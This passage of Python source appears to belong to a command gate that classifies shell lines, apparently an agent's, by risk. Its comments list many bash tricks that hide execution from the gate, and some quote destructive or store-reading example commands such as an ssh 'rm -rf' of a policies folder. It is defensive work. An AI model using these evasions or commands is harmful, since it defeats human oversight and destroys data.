    if name in _EXPORTERS:
        return any(a.dynamic or not a.text.startswith(("-", "+")) for a in args)
    if name == "set":
        i = 0
        while i < len(args):
            t = args[i].text
            if args[i].dynamic or not re.fullmatch(r"[-+][A-Za-z]+", t) or set(t[1:]) & {"a", "k"}:
                return True                       # allexport, keyword, or new positional parameters (`set -- x`)
            if "o" in t:                          # `set -o NAME`: the same two by name
                i += 1
                if i < len(args) and (args[i].dynamic or args[i].text in ("allexport", "keyword")):
                    return True
            i += 1
        return False
    if name == "shopt":
        return any(a.dynamic or re.fullmatch(r"-[a-z]*[su][a-z]*", a.text) for a in args)
    if name == "printf":
        return bool(args) and (args[0].dynamic or args[0].text.startswith("-v"))
    return name in _STATE_ALWAYS or (name in _STATE_OPERANDS and bool(args))


def _feed_compound(cmds: list[_Cmd], start: int, closer: _Cmd, src: _Cmd | None, taken: dict,
                   fnames: set) -> None:
    """A compound command's stdin reaches the commands inside it: a heredoc or here-string after its
    closing `}`, `)`, `done`, `fi` or `esac`, and text piped into it. As in bash, a command whose stdin is
    already set keeps it: its own redirection, a pipe from a command inside, or a nested compound's closer
    or pipe (inner closers are fed first). After an `exec < file` inside, nothing more is fed. The closer's
    own redirection wins over a pipe in, and its `<` over its heredoc too (the lexer keeps no order between
    them), so then nothing is fed. A feed whose text the gate cannot read — that `<`, or a pipe in whose
    text is not known — marks the inner commands `stdin_unknown` instead (#316), so a reader of its stdin
    still asks. Every other inner command gets all of it, an over-approximation: only
    shells, interpreters and gh read it."""
    if src is None and not _own_stdin(closer):
        return
    redirected = any(op in _READ_REDIRS for op, _ in closer.redirs)
    heredocs, texts = list(closer.heredocs), list(closer.herestrings)
    piped = _piped_text(src, taken) if src is not None and not _own_stdin(closer) else None
    if piped is not None:
        texts.append(_Word(piped))
    # A feed whose text the gate cannot read (#316): the closer's `<` (a file or a descriptor; a lone
    # `< /dev/null` feeds nothing), or a pipe in whose text is not known. The inner commands are marked
    # instead of fed, so a reader of its stdin (ssh) still asks.
    unknown = (any(op in _READ_REDIRS and not (op == "<" and t.text == "/dev/null") for op, t in closer.redirs)
               or (src is not None and piped is None and not _own_stdin(closer)))
    i, sets = start, False
    while i < len(cmds) and not sets:
        if i in taken:                  # a nested compound with its own stdin, skipped whole (linear)
            i, sets = taken[i]
            continue
        k = cmds[i]
        sets = _sets_shell_stdin(k, fnames)
        fed = not (sets or _own_stdin(k) or (i > start and k.piped_in))
        k.fed = k.fed or fed            # its own text does not name its stdin (#394)
        if fed and unknown:
            k.stdin_unknown = True
        elif fed and not redirected:
            k.heredocs, k.herestrings = heredocs, texts      # shared, so _once reads them once per line
        i += 1
    if len(cmds) > start:
        taken[start] = (len(cmds), sets)


def _once(ctx: dict, key: tuple, k: _Cmd, piped: str | None, read: Callable[[str], list[Classification]],
          ambiguous: bool = False, own: str | None | EllipsisType = ...) -> list[Classification]:
    """read(text) for each stdin text of k (each heredoc body after an ambiguous delimiter, if ambiguous), run
    once per command line and key. A compound's stdin reaches every command inside it (as the same lists), and
    each command still gets copies of the parts, since its own store check (_store_touch) reads them; the same
    lists again give the most severe part of each category, all that check and _combine look at. Without this a
    body of fed shells, itself fed to many shells, is read width ** depth times, and many here-strings fed to
    many shells cost their product.
    A reader whose parts carry its own text (#394) passes that text as ``own``. The text is then read with _READER
    in its place, and each reader gets copies with its own text there (_restamp): `{ psql -d test; psql -d prod; }
    <<EOF` gives psql -d prod parts with its own text. Each text is still read once per line, since every read
    spends the call's budgets (_brace_budget) and a second read could find them spent."""
    memo = ctx.setdefault("stdin", {})
    whole = (*key, id(k.heredocs), id(k.herestrings), piped, ambiguous)
    if whole in memo:
        return [_copy(_restamp(ctx, c, own)) for c in memo[whole]]
    got: list[Classification] = []
    for text in [h.body for h in k.heredocs if h.ambiguous] if ambiguous else _stdin_texts(k, piped):
        if (*key, text) not in memo:
            memo[(*key, text)] = read(text) if own is ... else _read_as_reader(read, text)
        got += memo[(*key, text)]
    memo[whole] = [max((p for p in got if p.category == c), key=_severity)
                   for c in dict.fromkeys(p.category for p in got)]
    return [_copy(_restamp(ctx, c, own)) for c in got]


def _read_as_reader(read: Callable[[str], list[Classification]], text: str) -> list[Classification]:
    """read(text), with _READER as the own text of each part it makes for the reading command (#394)."""
    slot = _own_text.get()
    if slot is None:
        return read(text)
    was, slot[0] = slot[0], _READER
    try:
        return read(text)
    finally:
        slot[0] = was


def _restamp(ctx: dict, c: Classification, own: str | None | EllipsisType) -> Classification:
    """``c``, a part _once stored, with ``own`` as the own text of each part in it that has _READER (#394). Only those
    parts and the parts built from them are copied, once per line for each part and own text: the many readers
    of a compound's stdin get the same few parts, and one of them may be built from many."""
    if own is ...:
        return c
    holds, done = ctx.setdefault("stand_in", {}), ctx.setdefault("restamped", {})

    def held(p: Classification) -> bool:
        if id(p) not in holds:
            holds[id(p)] = p.own is _READER or any([held(q) for q in p.parts])
        return holds[id(p)]

    def walk(p: Classification) -> Classification:
        if not held(p):
            return p
        if (id(p), own) not in done:
            done[(id(p), own)] = replace(p, parts=[walk(q) for q in p.parts], own=own if p.own is _READER else p.own)
        return done[(id(p), own)]
    return walk(c)


def _copy(c: Classification) -> Classification:
    """A part to hand out again: _combine and the callers change the one they get."""
    return replace(c, signals=list(c.signals), _command_views=list(c._command_views))


# Builtins that take a variable name and evaluate an array subscript in it as arithmetic, which runs any
# $( ) or ` ` there (#179): program -> (options whose value is a name, options with another value, operands are names).
_NAME_BUILTINS = {"printf": ("v", "", False), "read": ("a", "dinNptu", True), "declare": ("", "", True),
                  "typeset": ("", "", True), "local": ("", "", True), "unset": ("", "", True),
                  "wait": ("p", "", False), "test": ("v", "", False), "[": ("v", "", False),
                  "readonly": ("", "", True), "export": ("", "", True)}
# Those that also evaluate the value of a NAME=VALUE operand again (#188): a compound value `(..)` is parsed again
# as words even when quoted, and for the first three a -i value is arithmetic, a -n value a name. readonly and
# export never evaluate a name's subscript (`not a valid identifier`), have no -i, and their -n removes an attribute.
_DECLARES = ("declare", "typeset", "local", "readonly", "export")
_SCANS = {"$": _Lexer._dollar, "`": _Lexer._backtick}   # else <( ) or >( )


def _arith_scan(text: str, i: int, nested: bool = True, procsub: bool = False) -> tuple[int, list[str], bool]:
    """Read text from i as bash reads an arithmetic subscript: to the ] that ends it (a quote or \\ hides a ]), or
    to the end when not `nested`, outside any subscript. (end, the $( ) and ` ` bodies in it, and the <( ) ones
    with `procsub`, any expansion or quoting there.)"""
    lx, level, other, q, inner = _Lexer(text, scan=False), 1 if nested else 0, False, "", 0
    lx.i = i
    while lx.i < len(text) and (level or not nested):
        ch = text[lx.i]
        if ch == "`" or text.startswith(("$(", "${") + (("<(", ">(") if procsub else ()), lx.i):   # in any quoting
            _SCANS.get(ch, _Lexer._procsub)(lx, _Word())
            other = True
            continue
        if ch == "\\" and q != "'":   # a top-level \$ or \` is literal; bash < 5.2 expands a nested [ ] again
            lx.i += 1
            if text[lx.i:lx.i + 1] in ("$", "`") and (level > 1 or inner > 0):
                other = True
                continue
        elif ch in "'\"" and q in ("", ch):
            q, inner = ("" if q else ch), 0
        elif not q:
            level += {"[": 1, "]": -1}.get(ch, 0)
        elif q == '"':   # bash 3.2 reads a [ ] in double quotes as a nested subscript
            inner += {"[": 1, "]": -1}.get(ch, 0)
        other = other or ch in "\\'\"$"   # quoting or a variable: bash reads it, the gate does not
        lx.i += 1
    return lx.i, lx.subs, other


def _compound_scan(value: str, arith: bool) -> tuple[list[str], bool]:
    """A compound value `(..)` that declare parses again as words: the $( ), ` `, <( ) and >( ) bodies in it,
    read in any quoting, and whether it holds what bash evaluates again: an expansion or quoting in a
    `[key]=` subscript, or with -i (`arith`) an expansion in an element."""
    lx, q, start, other = _Lexer(value, scan=False), "", True, False
    lx.i = 1
    while lx.i < len(value):
        ch = value[lx.i]
        if start and ch == "[":
            lx.i, subs, odd = _arith_scan(value, lx.i + 1, procsub=True)
            lx.subs, other = lx.subs + subs, other or odd
        elif ch == "`" or value.startswith(("$(", "<(", ">("), lx.i):
            _SCANS.get(ch, _Lexer._procsub)(lx, _Word())
            other = other or arith
        else:
            if ch == "\\" and q != "'" and value[lx.i + 1:lx.i + 2] not in ("$", "`"):
                lx.i += 1
            elif ch in "'\"" and q in ("", ch):
                q = "" if q else ch
            other = other or (arith and ch == "$")
            lx.i += 1
        start = not q and ch in " \t\n"
    return lx.subs, other


def _subscript_parts(prog: str, words: list[_Word], cmd: str, depth: int, done: list[str],
                     late: list[Classification], inherits: bool = False, line: bool = False) -> list[Classification]:
    """The commands inside the array subscripts of a name-taking builtin's name arguments, whatever their quoting
    (`done`: bodies the line's own parse already classified), and in the values declare evaluates again (into
    `late`, which the line adds after its own $( ) bodies, as it would for the same value unquoted). Any
    expansion there also asks: bash evaluates its value (a variable's, or a $( )'s output) as arithmetic or code
    too, and a value such as `b[$(cmd)]` runs cmd. A command in a value read again is fed a stdin the gate cannot
    read when a $( ) of the line would be, or the builtin has one of its own, set up before it reads the value
    (`inherits`, #316); `line`: the line itself was fed one."""
    named, valued, operands = _NAME_BUILTINS[prog]
    args = [w.text for w in words]
    names, i, opts = [], 0, True
    attrs: set[str] = set()
    while i < len(args):
        a, i = args[i], i + 1
        if prog in ("test", "["):
            if a == "-v" and i < len(args):
                names.append((args[i], False))
            continue
        if opts and a == "--":
            opts = False
        elif opts and len(a) > 1 and a[0] in "-+":
            if prog in _DECLARES[:3]:
                attrs = attrs | set(a[1:]) if a[0] == "-" else attrs - set(a[1:])
            for n, letter in enumerate(a[1:], 2):
                if letter in named + valued:
                    val = a[n:] or (args[i] if i < len(args) else "")
                    i += 0 if a[n:] else 1
                    names += [(val, False)] if letter in named else []
                    break
        elif operands:
            names.append((a, words[i - 1].dynamic))
            opts = False
        else:
            break
    parts: list[Classification] = []
    # a body the line ran loses its \newlines too in a value bash reads again, but one that holds a single quote or
    # a here-document marker is compared as written (bash may keep its \newline), so a copy of it is read again
    def unwrapped(ds: Iterable[str]) -> set[str]:
        return set(ds) | {re.sub(r"(?<!\\)((?:\\\\)*)\\\n", r"\1", d) for d in ds
                          if "\\\n" in d and not re.search("'|<<", d)}

    done_set, outs = set(done), [d for d in done if isinstance(d, _OutSub)]
    bare, bare_outs = unwrapped(done), unwrapped(outs)
    for name, dynamic in names:
        m = re.match(r"[^=\[]*\[", name) if prog not in _DECLARES[3:] else None
        end, subs, other = _arith_scan(name, m.end()) if m else (name.find("="), [], False)
        value = re.match(r"\+?=(.*)", name[end:], re.S) if prog in _DECLARES and end >= 0 else None
        raw = value.group(1) if value else ""
        # a compound value is parsed again as words, and bash drops each \newline first (not an escaped
        # `\\<newline>`); an -i or -n value keeps it
        v, odd = re.sub(r"(?<!\\)((?:\\\\)*)\\\n", r"\1", raw) if raw.startswith("(") else raw, False
        more: list[str] = []
        if v.startswith("("):         # a compound value; one the line expanded is parsed again as code
            more, odd = _compound_scan(v, "i" in attrs)
            odd = odd or dynamic
        elif value and attrs & {"i", "n"}:   # arithmetic, or a name whose subscript runs when the nameref is used
            _, more, odd = _arith_scan(v, 0, nested=False)
        seen, seen_out = (bare, bare_outs) if v != raw else (done_set, set(outs))
        # a command bash runs only as it reads the value again; a >( ) body is read as fed, so only a >( ) body of
        # the line covers it (#316)
        more = [sub for sub in more if sub not in (seen_out if isinstance(sub, _OutSub) else seen)]
        parts += [classify_shell(sub, depth + 1) for sub in subs if depth < _DEPTH and sub not in done_set]
        late += [_classify_sub(sub, depth + 1, inherits, line) for sub in more if depth < _DEPTH]   # #316
        fresh = bool(more or set(subs) - done_set)   # commands the line's own parse did not see
        parts += [_too_deep(cmd)] if fresh and depth >= _DEPTH else []
        if other or odd or more:   # a signal, not an opaque part, so a deny on another part of the line still wins
            what = ("evaluates an array subscript the gate cannot read" if other else
                    "evaluates a value the gate cannot read" if odd else "runs a command in a value again")
            why = f"{prog} {what} ({name[:40]})"
            # `reread`: a command here may outrank a deny on the line, so naming opaque_exec does not lower this ask
            parts.append(_make("read", summary=why[:120], command=cmd,
                               signals=["indirection"] + (["reread"] if fresh else [])))
    return parts


def _runs_prompt(k: "_Cmd", literals: dict) -> str:
    """The parameter of the first `${..@P}` the command expands whose value the gate does not see (#579), ""
    when there is none. One of a variable the line assigns a literal value (no `$`, backtick or backslash, so
    the prompt expansion of it is the value itself) is known and keeps the line's class: the map holds the
    literal, or None where the last assignment set a value the gate cannot read. A prefix assignment
    sets the command's own environment, which bash expands the words before, so it is no source."""
    for w in [*k.words, *k.herestrings, *(t for _, t in k.redirs)]:
        if n := next((p for p in w.prompt if literals.get(p) is None), ""):
            return n
    for hd in k.heredocs:
        if n := next((p for p in hd.prompt if literals.get(p) is None), ""):
            return n
    return ""


def _classify_simple(k: _Cmd, cmd: str, depth: int, ctx: dict, piped: str | None = None) -> list[Classification]:
    """One simple command into its parts: the program's own category, the redirections, anything run
    inside it, and a store write when it touches the store."""
    words = list(k.words)
    while words and not words[0].quoted and words[0].text in _OPENERS:
        words = words[1:]
    loop: list[Classification] = []
    if words and not words[0].quoted and words[0].text == "for":
        loop = _indirect_sets("for", words, cmd)     # the loop variable: `for PATH in ...` sets PATH
        words = []                                   # a for header lists words, not programs
    before = words
    # #471: the old reading below scans the folder as it was before a `cd` the new reading reads, and signs the
    # late parts the new reading adds
    n_late, octx = len(ctx.get("late", [])), dict(ctx)
    sudos: list = []                            # each sudo or doas on the way (#491)
    words, sudo, split = _strip_prefix_words(words, sudos=sudos)
    parts: list[Classification] = []
    if words and words[0].text in ("read", "printf"):
        # `read` and `printf -v` fill names with a value the gate does not see, so a literal the line set for
        # one is gone from here on (#579)
        ctx.setdefault("literals", {}).update(
            {re.split(r"\[|\+?=", w.text, maxsplit=1)[0]: None for w in _filled_words(
                words[0].text.rsplit("/", 1)[-1], words[1:])})
    if n := _runs_prompt(k, ctx.setdefault("literals", {})):
        # a prompt transformation expands the value as a prompt string, its command substitutions included (#579)
        what = "the positional parameters" if n in ("@", "*") or n[:2] in ("@:", "*:") else n
        parts.append(_opaque(f"runs the prompt expansion of {what}, a value the gate does not see", cmd))
    # #591: env reads the words of an `env -S` text as its own argv. The first reading of the call reads the line env
    # runs (_env_split_lines), in every spelling of -S; the others read #634's leading words, or nothing more, as
    # before (_env_split_mode), and the mark tells classify which of them the call needs. In the first reading and
    # mode 3 a spelling main missed (`--split`, `-i0vS`) reads as `-S TEXT` does, its opaque part included; the
    # reading as before (mode 0) keeps what main read there.
    ms = _env_split_mode.get()
    mode, mark = ms or (2, [0])
    more = depth < _DEPTH and mode in (1, 2)
    old = _env_split_argv(split) if split is not None and more else None
    lines = (_env_split_lines(before) if mode == 2 else [old] if old else []) if more else []
    raw = _env_split_lines(before, True) if split is None and ms and mode in (2, 3) else []
    if raw and _env_s_text(raw[1]):
        split = raw[0]
    mark[0] |= 9 * bool(lines or raw) | 2 * bool(old)
    if split is not None or lines:
        parts.append(_opaque("env -S runs a command line", cmd))
        if depth < _DEPTH:
            parts += [classify_shell(x, depth + 1) for x in ([split] if split is not None else []) + lines]
    elif words:
        parts += _classify_program(words, k, cmd, depth, ctx, piped)
        if words[0].text in _NAME_BUILTINS and not words[0].dynamic:
            # #465: a value bash runs again after a `cd` into the store runs there too
            token = _cd_into.set((True, ctx.get("fd_cwd") or "")) if ctx.get("store_cwd") else None
            fed = bool(ctx.get("subs_fed")) or _stdin_given(k, piped)    # bash reads the value as it runs (#316)
            try:
                parts += _subscript_parts(words[0].text, words[1:] + k.operands, cmd, depth, ctx.get("subs", []),
                                          ctx.setdefault("late", []), fed, bool(ctx.get("stdin_unknown")))
            finally:
                if token is not None:
                    _cd_into.reset(token)
        parts += _exec_options(before, words, k, cmd, depth, ctx, piped)
    else:
        parts.append(_make("read", summary="shell assignment", command=cmd))
        parts += _exec_options(before, words, k, cmd, depth, ctx, piped) + loop
    # #471: before, a quoted prefix assignment (`X='a b' cmd`) was read as the program, an unknown one that asks, and
    # cmd was not read. That reading stays beside cmd's, and the parts read from cmd are signed, so decide also decides
    # the line with the parts read before on top (_QUOTED): no decision is looser than before. Also when cmd is an
    # `env -S` (words is [] then), so the quoted word's value is still scanned for store paths and env-inject names.
    old_words = _strip_prefix_words(before, False)[0]
    old_parts: list[Classification] = []
    if len(old_words) > len(words):
        signed: dict = {}
        if "late" in ctx:
            ctx["late"][n_late:] = [_signed(p, _QUOTED, signed) for p in ctx["late"][n_late:]]
        old_parts = _classify_program(old_words, k, cmd, depth, ctx, piped) + \
            _exec_options(before, old_words, k, cmd, depth, ctx, piped)
        parts = [_signed(p, _QUOTED, signed) for p in parts] + old_parts
    if sudo:
        parts[0].signals.append("sudo")
        _run_privileged(parts[0])
        shell = [] if _sudo_shell_off.get() else _sudo_shell_parts(sudos, words, k, cmd, depth, ctx, piped)
        if shell and (memo := _call_memo.get()) is not None:
            memo[_SUDO_READ] = True               # _read_core reads the call as before #491 too
        parts += shell
    if k.heredocs:
        # dash and ash may end the body early and run the rest: read it as commands too. Once per line, under
        # _once's key for a shell reading it: a compound's heredoc reaches every command inside it.
        parts += _once(ctx, (classify_shell, depth + 1), k, None, lambda t: [
            classify_shell(t, depth + 1) if depth < _DEPTH else _too_deep(cmd)], True)
    for op, t in k.redirs:
        if op not in _WRITE_REDIRS or (op == ">&" and re.fullmatch(r"\d+|-", t.text)):
            continue
        dest = _expand_text(t.text)
        if dest in ("/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty"):
            continue
        if t.dynamic and "$" in dest:
            parts.append(_opaque(f"writes to a path from a variable ({t.text[:60]})", cmd))
            if t.legacy:                       # main read a legacy `$[ ]` here as text; keep that write beside (#588)
                parts.append(_make("local_write", summary=f"write {t.text}"[:120], target=t.text, link=t.text,
                                   command=cmd))
                if sudo:
                    ctx.setdefault("sudo_writes", []).append(parts[-1])     # #454, _classify_shell
        else:
            parts.append(_make("local_write", summary=f"write {t.text}"[:120], target=t.text, link=t.text, command=cmd))
            if sudo:
                ctx.setdefault("sudo_writes", []).append(parts[-1])     # #454, _classify_shell
    # #471: the quoted assignment word is scanned as before, first, with that reading's parts and folder, so a store
    # path in its value (or the folder a `cd` left) still counts as main read it; then cmd, with its own. Each store
    # path either scan meets stays (#514)
    old_ids = {id(p) for p in old_parts}
    hits = list(dict.fromkeys(
        (_store_touch(k, old_words, [p for p in parts if _QUOTED not in p.signals], octx)
         if len(old_words) > len(words) else [])
        + _store_touch(k, words, [p for p in parts if id(p) not in old_ids], ctx)))
    if hits:
        # #464: after `cd /dev`, a write the gate pins to a store path keeps the descriptor folder as a target too,
        # so a `target:/dev*` entry still matches it, as it matches any other write there (either reading's folder)
        hits += [d for d in dict.fromkeys((octx.get("fd_cwd"), ctx.get("fd_cwd"))) if d and d not in hits]
    for t in hits:
        # #217: a descriptor path is a store write because the gate cannot see what it names, not because the
        # command is known to write there (`gh ... --body-file /dev/stdin` reads it), so the card says just that
        what = (f"uses {t}, a descriptor path or folder the gate cannot resolve (it may lead to an Exo store file)"
                if _fd_path(t) or _FD_DIR.fullmatch(os.path.normpath(t)) else f"write to the Exo store: {t}")
        c = _make("store_write", summary=what[:120], target=t, link=t, command=cmd)
        c.signals.append("exo store")
        parts.append(c)
    if any(w.locale for w in [*k.words, *(t for _, t in k.redirs), *k.herestrings]):
        # The words are classified as decoded, so category, target and vetoes still see them, but a message
        # catalog can replace them: the indirection signal asks unless opaque_exec is named.
        for p in parts:
            p.signals += ["indirection", "locale translation"]
    return parts


_QUOTED = "quoted assignment"     # a part read from the command behind a quoted prefix assignment (#471)


def _signed(c: Classification, signal: str, memo: dict) -> Classification:
    """A copy of ``c`` and of the parts it was built from, each carrying ``signal`` (#471). Parts are shared, so they
    are copied, each once (memo)."""
    if id(c) not in memo:
        memo[id(c)] = replace(c, signals=[*c.signals, signal], parts=[],
                              own_signals=None if c.own_signals is None else [*c.own_signals, signal])
        memo[id(c)].parts = [_signed(p, signal, memo) for p in c.parts]
    return memo[id(c)]


def _classify_program(words: list, k: _Cmd, cmd: str, depth: int, ctx: dict,
                      piped: str | None) -> list[Classification]:
    p = words[0]
    argv = [w.text for w in words]
    if p.dynamic or (not p.quoted and (p.glob or re.search(r"\{[^}]*(,|\.\.)[^}]*\}", p.text))):
        return [_opaque(f"program name comes from a variable or command output ({p.text[:40]})", cmd)]
    prog = p.text
    if prog.rsplit("/", 1)[-1] == "muse" and any(a in ("login", "auth", "logout") for a in argv[1:]):
        # The credential floor applies to launchers named by path too, before opaque path handling can hide it.
        return [_make("credentials", summary=f"muse {next(a for a in argv[1:] if a in ('login', 'auth', 'logout'))}",
                      command=cmd)]
    if "/" in prog:
        if not _trusted_path(prog):
            return [_opaque(f"runs a program by path ({prog[:60]})", cmd, target=prog)]
        prog = prog.rsplit("/", 1)[-1]
    prog = re.sub(r"^(python|pypy|pip)\d+(\.\d+)*$", r"\1", prog)
    argv[0] = prog
    sub = argv[1] if len(argv) > 1 else ""
    inner_depth = depth + 1

    def inner_words(ws: list) -> list[Classification]:
        if not ws:
            return []
        if depth >= _DEPTH:
            return [_too_deep(cmd)]
        return _classify_simple(_wrapped(k, ws), cmd, inner_depth, ctx, piped)

    if prog in _WRAPPERS:
        return _classify_wrapper(prog, words, cmd, depth, inner_words)
    if prog in _OPAQUE_PROGRAMS:
        parts = [_opaque(f"{prog}: {_OPAQUE_PROGRAMS[prog]}", cmd)]
        if prog in ("coproc", "function"):
            # bash: `coproc [NAME] compound_command`, `function NAME compound_command`. The name is
            # skipped before a compound opener; before a simple command (`coproc w echo hi`) the first
            # word is the program. Keep the original words so quotes, expansion flags and stdin survive.
            body, alt = words[1:], []
            if len(body) > 1 and not body[1].quoted and body[1].text in _COMPOUND:
                if prog == "coproc" and (words[0].redir_after or body[0].redir_after):
                    # A redirection between `coproc`, the name and the opener: bash reads a simple command that
                    # runs the name (#207). The skipped reading stays too, so nothing it caught is lost.
                    alt = body
                body = body[1:]
            elif prog == "function":
                body = []                        # `function f() { ...; }`: the body is parsed as its own command
            parts += inner_words(body) + inner_words(alt)
            # An environment dump is credentials; classify_shell looks for one only in top-level commands.
            for ws in (body, alt):
                i = next((n for n, w in enumerate(ws) if w.quoted or w.text not in _OPENERS), len(ws))
                if _env_dump(_strip_prefixes_keep_env([w.text for w in ws[i:]])[0]):
                    parts.append(_make("credentials", summary="shell touching environment dump", command=cmd,
                                       signals=["secret store"]))
                    break
        if prog == "trap" and len(argv) > 1 and depth < _DEPTH:
            parts.append(classify_shell(argv[1], inner_depth))
        return parts
    if prog == "eval":
        parts = [_opaque("eval runs text as a command", cmd)]
        if depth < _DEPTH:
            parts.append(classify_shell(" ".join(argv[1:]), inner_depth))
        return parts
    if prog in _SHELLS:
        args = argv[1:]
        if args[:1] in (["--version"], ["--help"]):
            return [_make("read", summary=f"{prog} {args[0]}", command=cmd)]
        parts = [_opaque(f"{prog} runs shell commands", cmd)]
        for i, a in enumerate(args):
            if a == "-c" or (re.fullmatch(r"-[a-zA-Z]+", a) and "c" in a):
                if depth < _DEPTH:
                    parts.append(classify_shell(args[i + 1] if i + 1 < len(args) else "", inner_depth))
                return parts
            if not a.startswith(("-", "+")):
                parts[0].summary = f"{prog} runs the script {a}"[:120]
                return parts
        _runs_stdin(parts[0], k)
        if depth < _DEPTH:
            parts += _once(ctx, (classify_shell, inner_depth), k, piped, lambda t: [classify_shell(t, inner_depth)])
        return parts
    if prog in _INTERPRETERS:
        return _classify_interpreter(prog, argv, k, cmd, depth, ctx, piped)
    if prog == "xargs":
        i = 1
        while i < len(words) and words[i].text.startswith("-"):
            i += 2 if words[i].text in ("-I", "-n", "-P", "-L", "-s", "-d", "-E", "-a") else 1
        return [_runs_stdin(_opaque("xargs builds a command from its input", cmd), k)] + inner_words(words[i:])
    if prog == "find":
        parts = [_make("read", summary="find", command=cmd)]
        i = 1
        while i < len(words):
            if words[i].text in ("-exec", "-execdir", "-ok", "-okdir"):
                j = i + 1
                while j < len(words) and words[j].text not in (";", "+"):
                    j += 1
                parts += [_opaque(f"find {words[i].text} runs a command per file", cmd)] + inner_words(words[i + 1:j])
                i = j
            elif words[i].text == "-delete":
                parts.append(_make("delete", summary="find -delete", target=argv[1] if len(argv) > 1 else "",
                                   command=cmd))
            elif words[i].text in ("-fprint", "-fprint0", "-fprintf", "-fls"):
                parts.append(_make("local_write", summary=f"find {words[i].text}", command=cmd))
            i += 1
        return parts
    if prog in ("cd", "pushd"):
        target = next((w for w in words[1:] if not w.text.startswith("-")), None)
        dest = target.text if target else ""
        seen = ctx.setdefault("store_braces", {})
        if target and (_shell_hits(target, seen, "dir", _store_dir_hit) != [] or _unknown_store(target, seen, inside=True)):
            ctx["store_cwd"] = True
            into = _expand_text(dest).strip()
            fd = bool(_fd_path(into) or _FD_DIR.fullmatch(os.path.normpath(into or ".")))
            if fd:
                ctx.setdefault("fd_cwd", into)     # #217: the card names the descriptor folder, not "the store"
            ctx.setdefault("cd_dirs", []).append(into if fd else "")   # each one, for a loop's second pass (#479)
        return [_make("read", summary=f"{prog} {dest}".strip(), command=cmd)]
    if prog == "awk" or prog in ("gawk", "nawk", "mawk"):
        script = next((a for a in argv[1:] if not a.startswith("-")), "")
        if re.search(r"\bsystem\s*\(|\|\s*getline|\bprint[f]?\b[^;}]*(\||>)", script):
            return [_opaque("awk program runs commands or writes files", cmd)]
        return [_make("read", summary="awk", command=cmd)]
    if prog == "sed":
        scripts = _opts(argv, "-e", "--expression") or [a for a in argv[1:] if not a.startswith("-")][:1]
        if any(re.search(r"(^|[;{}\n])\s*[0-9,$/!]*\s*[ew](\s|$)|/[gpIiM0-9]*[ew]([\s;}]|$)", s) for s in scripts):
            return [_opaque("sed script runs a command or writes a file", cmd)]
        if _has(argv, "-i") or any(a.startswith("--in-place") for a in argv):
            return [_make("local_write", summary="sed -i", command=cmd)]
        return [_make("shell", summary="sed", command=cmd)]
    if prog == "git":
        return [_classify_git(argv, cmd)]
    if prog == "exo":
        return [_classify_exo(argv, cmd)]
    if prog == "gh":
        # A word bash splits is a word from an expansion here, also `$(cat <<'EOF' .. EOF)` outside quotes (#399).
        dyn = frozenset(i for i, w in enumerate(words) if _expands(w) or w.split)
        return [_classify_gh(argv, cmd, ctx.get("post_stdin"), dyn, frozenset(i for i in dyn if _gh_splits(words[i])))]
    if prog in ("curl", "wget", "http", "https", "xh", "httpie"):
        return [_classify_http(argv, cmd, frozenset(i for i, w in enumerate(words) if _expands(w)),
                               k.piped_in or _own_stdin(k))]
    if prog in ("ssh", "mosh"):
        rest, i, moved, runs, here = argv[1:], 0, "", [], False
        # The host and command as the gate read them before D-075, for both programs.
        old = 0
        while old < len(rest) and rest[old].startswith("-"):
            old += 2 if rest[old] in _SSH_VALUE_OPTS_READ else 1
        old_tail = rest[old + 1:]
        old_dest, old_inner = (rest[old] if old < len(rest) else ""), " ".join(old_tail[old_tail[:1] == ["--"]:])
        if prog == "mosh":
            # mosh reads its options with Perl's Getopt::Long, not getopt (see _mosh_args); `--local` runs the
            # server and the command on this machine.
            rest, opts, bad = _mosh_args(rest)
            runs = [(o, v) for o, v in opts if o in ("ssh", "client", "server")]
            here = any(o == "local" for o, _ in opts)
            moved = f"{bad.partition('=')[0]}: not one of mosh's options" if bad else ""
            # Another option's value that reads as --server, --ssh or --client (`--port '--server=...'`): mosh
            # takes it as that value and does not run it, but the gate read it as a command before, so it still
            # does, and the line asks.
            for opt, val in opts:
                for o2, v2 in _mosh_args([val])[1] if val and opt not in ("ssh", "client", "server") else ():
                    if o2 in ("ssh", "client", "server"):
                        runs.append((o2, v2))
                        moved = moved or f"--{opt}: takes a value that reads as --{o2}"
        flags = ""
        if prog == "ssh":
            i, flags = _ssh_options(rest, 0)
        dest = rest[i] if i < len(rest) else ""
        host = _ssh_host(dest)
        tail = rest[i + 1:]
        if prog == "ssh" and tail[:1] == ["--"]:      # a `--` right after the host ends ssh's options
            tail = tail[1:]
        inner = " ".join(tail)
        # ssh's stdin is its line's, and the line was fed one the gate cannot read: a >( ) body, or the remote
        # command of an ssh that passes its stdin on (#316). A command's own `<`, a pipe into it or a compound
        # around it gives it another, and so does one of these around a wrapper that runs it (_wrapped).
        fed_line = bool(ctx.get("stdin_unknown")) and not (k.fed or k.piped_in or k.stdin_apart or _own_stdin(k))
        forwards = prog == "ssh" and _ssh_forwards(words, k, piped, i, flags, fed_line)
        if inner and depth >= _DEPTH:
            # A chain past the cap is not read, so it asks (#153). The hops that were read keep the
            # first host as target, so a `target:` deny on it still matches.
            c = _too_deep(cmd, "ssh chain nested too deep to read", dest)
            c.signals.append("unread hops")
        elif inner:
            c = classify_shell(inner, inner_depth)
            # #320: where an expansion form makes the remote line a secret or store line, the part that decided it
            # before keeps the host as its target, as the remote line itself did (`ssh host 'cat ~/.exo/$(printf
            # ledger.sqlite)'` was a read of host), so a reserved or rule entry on it still lists it. A copy with no
            # parts and no post, so the posting checks read each post once.
            kept = [p for p in c.parts if not p.other_store]
            top = (next((p for cat in ("credentials", "store_write") for p in kept if p.category == cat), None) or
                   _most_severe(kept)) if c.category in ("credentials", "store_write") else None
            if top is not None and not top.target:
                c.parts = [*c.parts, replace(top, target=dest, parts=[], text="", title="", text_file="", own_signals=[
                    s for s in (top.signals if top.own_signals is None else top.own_signals) if s != "unseen_body"])]
            elif top is not None and _fold_made(top.target) and \
                    (prior_action := _most_severe([p for p in c.parts
                                          if p.category not in ("credentials", "store_write")])) is not None and \
                    prior_action.target != dest:
                # #601: the fold made the part that took the line's category, so the decision on the alt target
                # (#399) — the copy of the action on the host — no longer carries it: the line read as an ordinary
                # delete there before (`ssh host 'rm -rf ~/.EXO/policies'` listed (delete, host) among its reserved
                # parts, review of #635). The host keeps the line's own action beside the folded store path, as it
                # kept it while the path read as an ordinary one, and the plain-spelling rows keep every part they
